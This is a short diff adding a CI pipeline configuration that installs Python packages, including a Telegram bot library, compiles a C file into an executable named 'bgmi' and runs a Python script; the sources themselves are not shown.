@@ -1,0 +1,11 @@
+pipelines:
+  default:
+    - step:
+        name: Run Python Script
+        image: python:3.10
+        script:
+          - echo "MADE BY IPxGAMER.."
+          - pip install telebot pymongo aiohttp psutil pytz
+          - gcc -o bgmi rs.c -lpthread
+          - chmod +x bgmi
+          - python3 mmm.py
